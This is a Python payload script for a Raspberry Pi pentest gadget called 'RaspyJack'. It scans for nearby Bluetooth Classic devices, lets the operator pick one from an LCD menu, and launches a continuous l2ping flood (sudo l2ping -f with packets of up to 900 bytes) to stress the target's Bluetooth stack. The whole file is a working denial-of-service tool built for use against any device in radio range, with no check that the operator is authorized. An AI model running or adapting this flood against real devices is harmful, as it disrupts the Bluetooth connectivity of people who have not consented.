#!/usr/bin/env python3
"""
RaspyJack Payload -- Bluetooth L2CAP Ping Flood
================================================
Author: 7h30th3r0n3

Scan for Bluetooth Classic devices, select a target, and send continuous
L2CAP ping requests to stress the target's Bluetooth stack.  Uses
l2ping with configurable packet size.

Setup / Prerequisites
---------------------
- Bluetooth adapter (hci0)
- apt install bluez (provides l2ping)

Controls
--------
  OK         -- Select target / start flood
  UP / DOWN  -- Scroll device list
  KEY1       -- Scan for BT devices
  KEY2       -- Adjust packet size (200/400/600/900)
  KEY3       -- Exit
"""

import os
import sys
import time
import re
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

# ── Pin / LCD setup ──────────────────────────────────────────────────────────
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ── Constants ────────────────────────────────────────────────────────────────
HCI_DEV = None  # set in main() via select_bt_interface
ROWS_VISIBLE = 6
ROW_H = 12
PACKET_SIZES = [200, 400, 600, 900]

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
devices = []          # [{addr, name}]
selected_idx = 0
scroll_pos = 0
target_addr = ""
flooding = False
flood_proc = None
packets_sent = 0
packets_recv = 0
pkt_size_idx = 2      # default: 600
status_msg = "Idle"
_running = True
_scan_active = False


# ── HCI helpers ──────────────────────────────────────────────────────────────

def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


# ── Scan for BT Classic devices (bluetoothctl) ────────────────────────────────

def _scan_devices():
    """Scan for BT Classic devices using bluetoothctl."""
    global status_msg, _scan_active

    with lock:
        _scan_active = True
        status_msg = "Scanning..."

    _hci_up()
    found = []

    try:
        # Start bluetoothctl scan
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(
            input="power on\nscan on\n",
            timeout=12,
        )
    except (subprocess.TimeoutExpired, Exception):
        try:
            proc.kill()
        except Exception:
            pass

    time.sleep(0.5)

    # Collect discovered devices
    try:
        result = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            match = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.*)", line)
            if match:
                addr = match.group(1).upper()
                name = match.group(2).strip() or "(unknown)"
                found.append({"addr": addr, "name": name})
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:20]

    # Stop scanning
    try:
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(input="scan off\nquit\n", timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass

    with lock:
        devices.clear()
        devices.extend(found)
        status_msg = f"Found {len(found)} devices"
        _scan_active = False


# ── L2CAP flood thread ──────────────────────────────────────────────────────

def _flood_loop():
    """Run l2ping in flood mode against the target."""
    global flood_proc, packets_sent, packets_recv, status_msg, flooding

    with lock:
        addr = target_addr
        size = PACKET_SIZES[pkt_size_idx]

    if not addr:
        with lock:
            status_msg = "No target"
            flooding = False
        return

    _hci_up()

    with lock:
        status_msg = f"Flooding {addr[-8:]}"
        packets_sent = 0
        packets_recv = 0

    try:
        proc = subprocess.Popen(
            ["sudo", "l2ping", "-i", HCI_DEV,
             "-s", str(size), "-f", addr],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        with lock:
            flood_proc = proc

        for line in proc.stdout:
            with lock:
                if not flooding:
                    break

            line = line.strip()
            # Typical output: "44 bytes from AA:BB:CC:DD:EE:FF id 123 time 5.42ms"
            if "bytes from" in line:
                with lock:
                    packets_sent += 1
                    packets_recv += 1
            elif "Sent" in line or "ping" in line.lower():
                with lock:
                    packets_sent += 1

        proc.wait(timeout=3)

    except Exception as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:16]}"
    finally:
        with lock:
            p = flood_proc
            flood_proc = None
        if p:
            try:
                p.terminate()
                p.wait(timeout=3)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
        with lock:
            flooding = False
            if not status_msg.startswith("Err"):
                status_msg = "Flood stopped"


# ── Start / stop flood ──────────────────────────────────────────────────────

def _start_flood(addr):
    global target_addr, flooding
    with lock:
        if flooding:
            return
        target_addr = addr
        flooding = True
    threading.Thread(target=_flood_loop, daemon=True).start()


def _stop_flood():
    global flooding, status_msg
    with lock:
        flooding = False
        p = flood_proc
        status_msg = "Stopping..."
    if p:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    with lock:
        status_msg = "Stopped"


# ── Drawing ──────────────────────────────────────────────────────────────────

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        msg = status_msg
        active = flooding
        devs = list(devices)
        sp = scroll_pos
        sel = selected_idx
        tgt = target_addr
        sent = packets_sent
        recv = packets_recv
        size = PACKET_SIZES[pkt_size_idx]
        scan_on = _scan_active

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BT L2CAP FLOOD", font=font, fill="#F44336")
    if active:
        d.ellipse((118, 3, 126, 11), fill="#FF0000")
    elif scan_on:
        d.ellipse((118, 3, 126, 11), fill="#FFAA00")
    else:
        d.ellipse((118, 3, 126, 11), fill="#888888")

    y = 15
    d.text((2, y), msg[:22], font=font, fill="#888")
    y += 12

    if active or tgt:
        d.text((2, y), f"Target: {tgt[-11:]}", font=font, fill="#FF4444")
        y += 12
        d.text((2, y), f"Size: {size}B  Sent: {sent}", font=font, fill="#FFAA00")
        y += 12
        d.text((2, y), f"Recv: {recv}", font=font, fill="#00FF00")
        y += 13
    else:
        y += 12

    if not active:
        # Device list
        end = min(sp + ROWS_VISIBLE - 2, len(devs))
        for i in range(sp, end):
            dev = devs[i]
            prefix = ">" if i == sel else " "
            name = dev["name"][:14]
            clr = "#FFAA00" if i == sel else "#CCCCCC"
            d.text((2, y), f"{prefix}{name}", font=font, fill=clr)
            y += ROW_H

        if not devs:
            d.text((2, y), "K1 to scan", font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if active:
        d.text((2, 117), "OK:Stop K2:Size K3:X", font=font, fill="#AAA")
    else:
        d.text((2, 117), "OK:Go K1:Scan K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global scroll_pos, selected_idx, pkt_size_idx, status_msg, HCI_DEV

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True, timeout=5)
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "BT L2CAP FLOOD", font=font, fill="#F44336")
    d.text((4, 28), "Bluetooth ping flood", font=font, fill="#888")
    d.text((4, 40), "using l2ping.", font=font, fill="#888")
    d.text((4, 60), "K1=Scan  OK=Start", font=font, fill="#666")
    d.text((4, 72), "K2=Pkt size  K3=Exit", font=font, fill="#666")
    d.text((4, 90), f"Pkt size: {PACKET_SIZES[pkt_size_idx]}B", font=font, fill="#FF4444")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            if btn == "KEY1":
                if not _scan_active and not flooding:
                    threading.Thread(target=_scan_devices, daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK":
                with lock:
                    active = flooding
                if active:
                    _stop_flood()
                else:
                    with lock:
                        devs = list(devices)
                        sel = selected_idx
                    if devs and 0 <= sel < len(devs):
                        _start_flood(devs[sel]["addr"])
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    selected_idx = max(0, selected_idx - 1)
                    if selected_idx < scroll_pos:
                        scroll_pos = selected_idx
                time.sleep(0.2)

            elif btn == "DOWN":
                with lock:
                    selected_idx = min(len(devices) - 1, selected_idx + 1)
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        scroll_pos = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.2)

            elif btn == "KEY2":
                with lock:
                    pkt_size_idx = (pkt_size_idx + 1) % len(PACKET_SIZES)
                    status_msg = f"Size: {PACKET_SIZES[pkt_size_idx]}B"
                time.sleep(0.25)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_flood()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
